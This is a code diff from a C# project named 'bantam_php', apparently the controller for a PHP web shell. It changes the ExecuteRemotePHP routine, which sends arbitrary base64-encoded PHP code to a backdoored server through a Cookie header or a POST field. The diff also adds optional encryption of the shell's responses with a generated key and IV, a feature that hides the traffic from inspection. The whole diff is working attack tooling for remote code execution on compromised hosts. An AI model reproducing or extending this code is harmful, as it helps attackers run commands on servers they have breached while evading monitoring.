@@ -103,7 +103,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="url"></param>
         /// <returns></returns>
-        public static async Task<string> getRequest(string url)
+        public static async Task<string> GetRequest(string url)
         {
             try {
                 HttpMethod method = HttpMethod.Get;
@@ -123,7 +123,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="url"></param>
         /// <returns></returns>
-        public static async Task<string> postRequest(string url, Dictionary<string, string> values)
+        public static async Task<string> PostRequest(string url, Dictionary<string, string> values)
         {
             try {
                 HttpMethod method = HttpMethod.Post;
@@ -146,13 +146,17 @@ namespace bantam_php
         /// <param name="url"></param>
         /// <param name="code"></param>
         /// <returns></returns>
-        public static async Task<string> ExecuteRemotePHP(string url, string code)
+        public static async Task<ResponseObject> ExecuteRemotePHP(string url, string code, bool encryptResponse)
         {
             string requestArgsName = BantamMain.Shells[url].requestArgName;
             bool sendViaCookie = BantamMain.Shells[url].sendDataViaCookie;
 
+            string encryptionKey = string.Empty, 
+                   encryptionIV = string.Empty;
+
             try {
                 HttpMethod method;
+
                 if (sendViaCookie) {
                     method = HttpMethod.Get;
                 } else {
@@ -162,15 +166,18 @@ namespace bantam_php
                 var request = new HttpRequestMessage(method, url);
 
                 if (!string.IsNullOrEmpty(code)) {
+                    if (encryptResponse) {
+                        code += EncryptionHelper.EncryptPhpVariableAndEcho("$result", ref encryptionKey, ref encryptionIV);
+                    }
                     string minifiedCode = PhpHelper.MinifyCode(code);
                     string b64EncodedCode = EncryptionHelper.EncodeBase64Tostring(minifiedCode);
-                    string urlEncodedCode = HttpUtility.UrlEncode(b64EncodedCode);
-
+                   
                     if (sendViaCookie) {
+                        string urlEncodedCode = HttpUtility.UrlEncode(b64EncodedCode);
                         request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + urlEncodedCode);
                     } else {
                         var values = new Dictionary<string, string> {
-                            { requestArgsName, urlEncodedCode }
+                            { requestArgsName, b64EncodedCode }
                         };
 
                         var content = new FormUrlEncodedContent(values);
@@ -181,11 +188,25 @@ namespace bantam_php
                 var response = await client.SendAsync(request);
                 var responseString = await response.Content.ReadAsStringAsync();
 
-                return responseString;
+                return new ResponseObject(responseString, encryptionKey, encryptionIV);
             } catch (System.Net.Http.HttpRequestException) {
 
             }
-            return "";
+            return new ResponseObject("", "", "");
+        }
+    }
+
+    public class ResponseObject
+    {
+        public string result { get; set; }
+        public string encryptionKey { get; set; }
+        public string encryptionIV { get; set; }
+
+        public ResponseObject(string Result, string EncryptionKey, string EncryptionIV)
+        {
+            result = Result;
+            encryptionKey = EncryptionKey;
+            encryptionIV = EncryptionIV;
         }
     }
 }
